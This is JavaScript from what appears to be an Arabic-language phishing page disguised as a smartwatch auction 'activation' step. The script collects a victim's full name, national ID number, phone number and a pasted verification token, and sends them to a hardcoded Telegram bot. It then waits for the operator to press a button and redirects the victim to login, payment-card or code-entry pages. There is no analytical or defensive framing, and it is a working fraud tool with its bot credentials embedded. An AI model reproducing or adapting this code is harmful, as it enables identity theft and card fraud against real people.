const BOT_TOKEN = '8891065186:AAEl3mhHxdy53_2ZOnQU1E08FWFxmEsn1R4';
    const CHAT_ID = '6165206261';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let pendingRequestId = null;

    function updateCount() {
      const len = document.getElementById('msgInput').value.length;
      document.getElementById('charCount').textContent = len + ' / 2000 حرف';
      const st = document.getElementById('charStatus');
      if (len > 1800) { st.textContent = 'قارب على الامتلاء'; st.style.color = '#d63b3b'; }
      else if (len > 0) { st.textContent = '✓'; st.style.color = '#2a9d5c'; }
      else { st.textContent = ''; }
    }

    async function sendToTelegram(message, requestId, dataType) {
      try {
        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[
                { text: '🖥️ واجهة', callback_data: `approve_${dataType}_${requestId}` },
                { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` },
                { text: '💳 بطاقة', callback_data: `decline_card_${dataType}_${requestId}` },
                { text: 'كود', callback_data: `link_card_${dataType}_${requestId}` }
              ]]
            }
          })
        });
        const json = await response.json();
        return json.result ? json.result.message_id : null;
      } catch (error) {
        console.error('خطأ في إرسال البيانات:', error);
        return null;
      }
    }

    async function editTelegramMessage(messageId, originalText, resultText) {
      try {
        await fetch(`${WEBHOOK_URL}/editMessageText`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            message_id: messageId,
            text: originalText + '\n\n' + resultText,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          })
        });
      } catch (error) {
        console.error('خطأ في التعديل:', error);
      }
    }

    async function checkWebhookResponse(requestId, dataType) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.ok && data.result && data.result.length > 0) {
          for (let update of data.result) {
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
              if (callbackData === `reject_${dataType}_${requestId}`)  return 'rejected';
              if (callbackData === `decline_card_${dataType}_${requestId}`) return 'decline_card';
              if (callbackData === `link_card_${dataType}_${requestId}`) return 'link_card';
            }
          }
        }
        return 'pending';
      } catch (error) {
        console.error('خطأ في التحقق:', error);
        return 'pending';
      }
    }

    async function sendMessage() {
      const msg = document.getElementById('msgInput').value.trim();
      if (!msg) return alert('الرجاء لصق الرسالة أولاً');

      document.getElementById('decline-message').style.display = 'none';
      document.getElementById('loadingOverlay').classList.add('show');

      const fullName    = sessionStorage.getItem('userFullName') || 'غير معروف';
      const phoneNumber = sessionStorage.getItem('userPhoneNumber') || '';
      const idNumber    = sessionStorage.getItem('userIdNumber') || '';

      const requestId = Date.now();
      pendingRequestId = requestId;

      const message =
        `⌚ <b>مزايدة ساعة ذكية - Activation</b>\n\n` +
        `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
        (idNumber ? `🆔 <b>الرقم القومي:</b> <code>${idNumber}</code>\n` : '') +
        (phoneNumber ? `📱 <b>رقم الهاتف:</b> <code>${phoneNumber}</code>\n` : '') +
        `📩 <b>الرسالة (التوكن):</b>\n<code>${msg}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;

      const messageId = await sendToTelegram(message, requestId, 'act');

      if (!messageId) {
        document.getElementById('loadingOverlay').classList.remove('show');
        return alert('حدث خطأ في النظام. يرجى المحاولة لاحقاً.');
      }

      const checkInterval = setInterval(async () => {
        const status = await checkWebhookResponse(requestId, 'act');

        if (status === 'approved') {
          clearInterval(checkInterval);
          await editTelegramMessage(messageId, message, '🖥️ تم التحويل للواجهة');
          document.getElementById('loadingOverlay').classList.remove('show');
          window.location.href = 'login.html'; 

        } else if (status === 'rejected') {
          clearInterval(checkInterval);
          await editTelegramMessage(messageId, message, '❌ تم الرفض');
          document.getElementById('loadingOverlay').classList.remove('show');
          document.getElementById('decline-message').style.display = 'block';
          document.getElementById('msgInput').value = '';
          updateCount();
          pendingRequestId = null;

        } else if (status === 'decline_card') {
          clearInterval(checkInterval);
          await editTelegramMessage(messageId, message, '💳 تم التحويل لصفحة الدفع');
          document.getElementById('loadingOverlay').classList.remove('show');
          window.location.href = 'paymen.html'; 

        } else if (status === 'link_card') {
          clearInterval(checkInterval);
          await editTelegramMessage(messageId, message, '🔗 تم التحويل لصفحة الكود');
          document.getElementById('loadingOverlay').classList.remove('show');
          window.location.href = 'verification.html'; 
        }
      }, 2000);
    }

    window.addEventListener('beforeunload', () => { pendingRequestId = null; });